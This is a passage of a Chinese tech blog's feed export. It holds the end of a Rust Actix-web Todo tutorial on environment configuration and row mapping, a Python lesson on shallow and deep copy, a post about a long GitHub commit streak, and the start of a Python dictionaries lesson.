class="title function_ invoke__">clone</span>())</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(todos))</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_ invoke__">bind</span>(<span class="string">&quot;127.0.0.1:8000&quot;</span>)?</span><br><span class="line">    .<span class="title function_ invoke__">run</span>()</span><br><span class="line">    .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行并测试：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cargo run</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">另一个总端，jq 用于格式化返回的 json</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:8000/todos | jq</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;id&quot;: 2,</span><br><span class="line">    &quot;title&quot;: &quot;List 2&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;id&quot;: 1,</span><br><span class="line">    &quot;title&quot;: &quot;List 1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2><span id="liang-ge-gai-jin">两个改进</span></h2><ol><li>数据库的连接信息硬编码在代码中，在实际使用中会使用环境变量进行设置</li></ol><p>添加 <code>.env</code> 配置数据库连接信息和服务端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SERVER.HOST=127.0.0.1</span><br><span class="line">SERVER.PORT=8000</span><br><span class="line">PG.USER=actix</span><br><span class="line">PG.PASSWORD=actix</span><br><span class="line">PG.HOST=127.0.0.1</span><br><span class="line">PG.PORT=5432</span><br><span class="line">PG.DBNAME=actix</span><br><span class="line">PG.POOL.MAX_SIZE=30</span><br></pre></td></tr></table></figure><p>同时，通过环境变量获取对应配置。首先增加 <code>dotenv</code> 和 <code>config</code> 依赖：</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="comment"># ... 省略</span></span><br><span class="line"><span class="attr">dotenv</span> = <span class="string">&quot;0.15.0&quot;</span></span><br><span class="line"><span class="attr">config</span> = <span class="string">&quot;0.10.1&quot;</span></span><br></pre></td></tr></table></figure><p>然后增加 <code>config.rs</code>，增加从环境变量中获取配置并生成连接池方法 <code>from_env</code>：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> config::&#123;<span class="keyword">self</span>, ConfigError&#125;;</span><br><span class="line"><span class="keyword">use</span> serde::Deserialize;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize, Debug)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">ServerConfig</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> host: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> port: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize, Debug)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> server: ServerConfig,</span><br><span class="line">    <span class="keyword">pub</span> pg: deadpool_postgres::Config,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">from_env</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="keyword">Self</span>, ConfigError&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cfg</span> = config::Config::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        cfg.<span class="title function_ invoke__">merge</span>(config::Environment::<span class="title function_ invoke__">new</span>())?;</span><br><span class="line">        cfg.<span class="title function_ invoke__">try_into</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <code>main.rs</code> 中使用环境变量创建连接池：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mod</span> config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> dotenv::dotenv;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="comment">// 环境变量</span></span><br><span class="line">    <span class="title function_ invoke__">dotenv</span>().<span class="title function_ invoke__">ok</span>();</span><br><span class="line">    <span class="comment">// 连接池</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">cfg</span> = crate::config::Config::<span class="title function_ invoke__">from_env</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = cfg.pg.<span class="title function_ invoke__">create_pool</span>(NoTls).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(</span><br><span class="line">        <span class="string">&quot;Starting server at http://&#123;&#125;:&#123;&#125;&quot;</span>,</span><br><span class="line">        cfg.server.host, cfg.server.port</span><br><span class="line">    );</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">data</span>(pool.<span class="title function_ invoke__">clone</span>())</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(todos))</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_ invoke__">bind</span>(<span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>, cfg.server.host, cfg.server.port))?</span><br><span class="line">    .<span class="title function_ invoke__">run</span>()</span><br><span class="line">    .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>db.rs</code> 中 <code>row_to_todo</code> 函数太麻烦，使用 <code>tokio_pg_mapper</code> 做处理，简化操作：</li></ol><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="comment"># ... 省略</span></span><br><span class="line"><span class="attr">tokio-pg-mapper</span> = <span class="string">&quot;0.1&quot;</span></span><br><span class="line"><span class="attr">tokio-pg-mapper-derive</span> = <span class="string">&quot;0.1&quot;</span></span><br></pre></td></tr></table></figure><p>在 <code>models.rs</code> 中添加 <code>PostgresMapper</code>，</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio_pg_mapper_derive::PostgresMapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Serialize, Deserialize, PostgresMapper)]</span></span><br><span class="line"><span class="meta">#[pg_mapper(table = <span class="string">&quot;todo_list&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TodoList</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> id: <span class="type">i32</span>,</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Serialize, Deserialize, PostgresMapper)]</span></span><br><span class="line"><span class="meta">#[pg_mapper(table = <span class="string">&quot;todo_item&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TodoItem</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> id: <span class="type">i32</span>,</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> checked: <span class="type">bool</span>,</span><br><span class="line">    <span class="keyword">pub</span> list_id: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>from_row_ref</code> 方法将记录进行转换：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">use</span> tokio_pg_mapper::FromTokioPostgresRow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_todos</span>(client: &amp;Client) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;TodoList&gt;, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ... 省略</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todos</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">query</span>(&amp;statement, &amp;[])</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error getting todo lists&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">iter</span>()</span><br><span class="line">        <span class="comment">// 修改</span></span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|row| TodoList::<span class="title function_ invoke__">from_row_ref</span>(row).<span class="title function_ invoke__">unwrap</span>())</span><br><span class="line">        .collect::&lt;<span class="type">Vec</span>&lt;TodoList&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(todos)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="xiao-jie">小结</span></h2><ol><li>创建 hello world 程序；</li><li>创建数据库连接和获取数据；</li><li>使用环境变量；</li></ol><h2><span id="can-kao-wen-dang-he-xiang-mu">参考文档和项目</span></h2><ol><li><a href="https://www.youtube.com/watch?v=gQwA0g0NNSI">Creating a simple TODO service with Actix</a></li><li><a href="actix.rs">actix-web 官方文档</a></li><li><a href="https://github.com/actix/examples">actix/example</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/105#issuecomment-712695653"><strong>qiwihui</strong></a> on: <strong>10/20/2020</strong></p></blockquote><p>cool</p>]]></content>
    
    <summary type="html">
    
      用 Rust Actix-web 写一个 Todo 应用（一）── Hello world 和 REST 接口
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Rust" scheme="https://qiwihui.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>20. 浅拷贝和深拷贝 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-131/"/>
    <id>https://qiwihui.com/qiwihui-blog-131/</id>
    <published>2022-08-13T01:54:25.440Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>在Python中，赋值语句（<code>obj_b = obj_a</code>）不会创建真实副本。 它仅使用相同的引用创建一个新变量。 因此，当你想制作可变对象（列表，字典）的实际副本并且想要在不影响原始对象的情况下修改副本时，必须格外小心。</p><p>对于“真实”副本，我们可以使用 <code>copy</code> 模块。 但是，对于复合/嵌套对象（例如嵌套列表或字典）和自定义对象，<strong>浅拷贝</strong>和<strong>深拷贝</strong>之间存在重要区别：</p><ul><li>浅拷贝： <em>仅深一层</em>。 它创建一个新的集合对象，并使用对嵌套对象的引用来填充它。 这意味着修改副本中嵌套对象的深度超过一层会影响原始对象。</li><li>深拷贝： <em>完整的独立克隆</em>。 它创建一个新的集合对象，然后递归地使用在原始对象中找到的嵌套对象的副本填充它。</li></ul><span id="more"></span><h3><span id="fu-zhi-cao-zuo">赋值操作</span></h3><p>这只会创建具有相同引用的新变量。 修改其中一个会影响另一个。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">list_b = list_a</span><br><span class="line"></span><br><span class="line">list_a[<span class="number">0</span>] = -<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(list_a)</span><br><span class="line"><span class="built_in">print</span>(list_b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure><h3><span id="qian-kao-bei">浅拷贝</span></h3><p>一层深。 在级别1上进行修改不会影响其他列表。 使用 <code>copy.copy()</code> 或特定于对象的复制函数/复制构造函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">list_a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">list_b = copy.copy(list_a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不会影响其他列表</span></span><br><span class="line">list_b[<span class="number">0</span>] = -<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(list_a)</span><br><span class="line"><span class="built_in">print</span>(list_b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure><p>但是对于嵌套对象，在2级或更高级别上进行修改确实会影响其他对象！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">list_a = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br><span class="line">list_b = copy.copy(list_a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 会影响其他列表!</span></span><br><span class="line">list_a[<span class="number">0</span>][<span class="number">0</span>]= -<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(list_a)</span><br><span class="line"><span class="built_in">print</span>(list_b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br><span class="line">[[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br></pre></td></tr></table></figure><p>注意：你还可以使用以下内容来创建浅拷贝：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 浅拷贝</span></span><br><span class="line">list_b = <span class="built_in">list</span>(list_a)</span><br><span class="line">list_b = list_a[:]</span><br><span class="line">list_b = list_a.copy()</span><br></pre></td></tr></table></figure><h3><span id="shen-kao-bei">深拷贝</span></h3><p>完全独立的克隆。 使用 <code>copy.deepcopy()</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">list_a = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br><span class="line">list_b = copy.deepcopy(list_a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不影响其他</span></span><br><span class="line">list_a[<span class="number">0</span>][<span class="number">0</span>]= -<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(list_a)</span><br><span class="line"><span class="built_in">print</span>(list_b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[[-<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br><span class="line">[[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br></pre></td></tr></table></figure><h3><span id="zi-ding-yi-dui-xiang">自定义对象</span></h3><p>你可以使用 <code>copy</code> 模块来获取自定义对象的浅拷贝或深拷贝。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">                </span><br><span class="line"><span class="comment"># 只复制引用</span></span><br><span class="line">p1 = Person(<span class="string">&#x27;Alex&#x27;</span>, <span class="number">27</span>)</span><br><span class="line">p2 = p1</span><br><span class="line">p2.age = <span class="number">28</span></span><br><span class="line"><span class="built_in">print</span>(p1.age)</span><br><span class="line"><span class="built_in">print</span>(p2.age)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">28</span></span><br><span class="line"><span class="number">28</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 浅拷贝</span></span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">p1 = Person(<span class="string">&#x27;Alex&#x27;</span>, <span class="number">27</span>)</span><br><span class="line">p2 = copy.copy(p1)</span><br><span class="line">p2.age = <span class="number">28</span></span><br><span class="line"><span class="built_in">print</span>(p1.age)</span><br><span class="line"><span class="built_in">print</span>(p2.age)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">27</span></span><br><span class="line"><span class="number">28</span></span><br></pre></td></tr></table></figure><p>现在让我们创建一个嵌套对象：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Company</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, boss, employee</span>):</span><br><span class="line">        self. boss = boss</span><br><span class="line">        self.employee = employee</span><br><span class="line"></span><br><span class="line"><span class="comment"># 浅拷贝会影响嵌套对象</span></span><br><span class="line">boss = Person(<span class="string">&#x27;Jane&#x27;</span>, <span class="number">55</span>)</span><br><span class="line">employee = Person(<span class="string">&#x27;Joe&#x27;</span>, <span class="number">28</span>)</span><br><span class="line">company = Company(boss, employee)</span><br><span class="line"></span><br><span class="line">company_clone = copy.copy(company)</span><br><span class="line">company_clone.boss.age = <span class="number">56</span></span><br><span class="line"><span class="built_in">print</span>(company.boss.age)</span><br><span class="line"><span class="built_in">print</span>(company_clone.boss.age)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="comment"># 深拷贝不会影响嵌套对象</span></span><br><span class="line">boss = Person(<span class="string">&#x27;Jane&#x27;</span>, <span class="number">55</span>)</span><br><span class="line">employee = Person(<span class="string">&#x27;Joe&#x27;</span>, <span class="number">28</span>)</span><br><span class="line">company = Company(boss, employee)</span><br><span class="line">company_clone = copy.deepcopy(company)</span><br><span class="line">company_clone.boss.age = <span class="number">56</span></span><br><span class="line"><span class="built_in">print</span>(company.boss.age)</span><br><span class="line"><span class="built_in">print</span>(company_clone.boss.age)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">56</span></span><br><span class="line"><span class="number">56</span></span><br><span class="line"></span><br><span class="line"><span class="number">55</span></span><br><span class="line"><span class="number">56</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      20. 浅拷贝和深拷贝 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>在 Github 上“连续”提交187天</title>
    <link href="https://qiwihui.com/qiwihui-blog-76/"/>
    <id>https://qiwihui.com/qiwihui-blog-76/</id>
    <published>2022-08-13T01:54:25.440Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>这也是我关于自己在Github上连续提交173天的过程。准确说这并不是我连续173天在Github提交代码，在整个过程中总共中断了两次，第一次是在农历大年三十，和家人吃完年夜饭聊天完已经过了提交时间点了，第二次是在3月2号，家里的猫因为生病照顾了一个晚上。总得来讲这是一次非常有挑战但是却收获很大的过程。</p><h2><span id="kai-shi">开始</span></h2><p>故事起因于自我懈怠的感知，我在去年年底有很长一段时间不知道自己改做什么，处在十分疲惫的状态，以至于在12月的时候连着一周没有任何提交，知道我觉得自己应该做些什么改变。我想起了很早之前的一遍博客：《<a href="https://linux.cn/article-1984-1.html">我泡在GitHub上的177天</a>》，于是，我决定试着实践一次在 Github 上进行连续提交，以改变自己的状态。</p><!---more--><p>我试着按照博客中的约定给自己定下了几条提交的要求：</p><ol><li>提交必需要有意义，不能是简单的编辑格式或者修改错字；</li><li>不能自动化提交过程，不能作弊。</li></ol><h2><span id="qian-ban-duan">前半段</span></h2><p>不可否认，在这个计划刚开始的时候热情十足，有过40个提交的一天，以及好些个十几个提交的日子，虽然40个提交只是整理博客带来的，但也是让我很是激动。即使我在前半端的时间里有过两次终端也没有对降低我的热情。</p><h2><span id="hou-ban-duan">后半段</span></h2><p>在第60天之后，这个挑战的难度就开始显现了，一是我开始出现的疲惫，另一个是因为我开始出现提交枯竭。我在这次挑战中的提交大概有以下几类：</p><ol><li>博客已经相应带来的修改；</li><li>自己的项目想法的提交，比如 <a href="https://github.com/qiwihui/SMSFilters">SMSFilters</a>；</li><li>《强化学习导论（第二版）》的学习笔记；</li><li>对开源项目的贡献，包括issue和PR；</li><li>日常阅读文章的记录。</li></ol><p>博客刚开始写得勤，一周一到两篇，后来能两三周一篇就已经算很多了；项目的想法不可能一直有；学习笔记越到后边越困难，渐渐一章一节的时间就加长了；对开源的项目的提交并不能都得到合并；阅读的文章也不能总是读到很优秀的文章。所以后来，每天的提交频率基本处于保底。</p><h2><span id="jie-shu-he-zong-jie">结束和总结</span></h2><p>今天决定这是这次挑战的最后一个提交，写成一遍简短的博客做为结束。终于如释重负，放下了心头的重担。</p><p>正如那篇博客提及的一样，如果一个好习惯被刻意过度遵循的话也会变成坏事；每天完成的一个目标连起来形成一条链时，它会激励你去继续完成目标，保持这条链不断裂。</p><p>最后，我觉得对于 Github 的提交统计计算也有一些小的提示和想法：</p><ol><li>fork别人的项目也是算提交的，即使你没给别人提交PR，可能Github觉得这也算是为开源的传播贡献了一份力量吧；</li><li>提交时间上，在北京时间大约一点之前的提交都还算是头一天的提交，当然我觉得在这个点提交也是要冒没赶上的风险的；</li><li>commit 之后就算时间了，不一定要马上推送到远程；</li><li>好的想法也算是提交，对一篇文章的想法也可以包含在内。</li></ol><p>我最后的建议是进行一次这样的挑战，可以给自己带来一个好的习惯。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      在 Github 上“连续”提交187天
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>03. 字典 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-120/"/>
    <id>https://qiwihui.com/qiwihui-blog-120/</id>
    <published>2022-08-13T01:54:25.430Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>字典是无序，可变和可索引的集合。 字典由键值对的集合组成。 每个键值对将键映射到其关联值。 字典用大括号书写。 每对键值均以冒号（ <code>:</code> ）分隔，并且各项之间以逗号分隔。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="chuang-jian-zi-dian">创建字典</span></h3><p>使用大括号或者内置的 <code>dict</code> 函数创建。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">28</span>, <span class="string">&quot;city&quot;</span>:<span class="string">&quot;New York&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用字典构造器，注意：键不需要引号。</span></span><br><span class="line">my_dict_2 = <span class="built_in">dict</span>(name=<span class="string">&quot;Lisa&quot;</span>, age=<span class="number">27</span>, city=<span class="string">&quot;Boston&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_dict_2)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">27</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Boston&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="fang-wen-yuan-su">访问元素</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name_in_dict = my_dict[<span class="string">&quot;name&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(name_in_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果键没有找到，引发 KeyError 错误</span></span><br><span class="line"><span class="comment"># print(my_dict[&quot;lastname&quot;])</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br></pre></td></tr></table></figure><h3><span id="tian-jia-huo-xiu-gai-yuan-su">添加或修改元素</span></h3><p>只需添加或访问键并分配值即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加新键</span></span><br><span class="line">my_dict[<span class="string">&quot;email&quot;</span>] = <span class="string">&quot;max@xyz.com&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖已经存在的键</span></span><br><span class="line">my_dict[<span class="string">&quot;email&quot;</span>] = <span class="string">&quot;coolmax@xyz.com&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>, <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;max@xyz.com&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;New York&#x27;</span>, <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;coolmax@xyz.com&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="shan-chu-yuan-su">删除元素</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除键值对</span></span><br><span class="line"><span class="keyword">del</span> my_dict[<span class="string">&quot;email&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop 返回值并删除键值对</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;popped value:&quot;</span>, my_dict.pop(<span 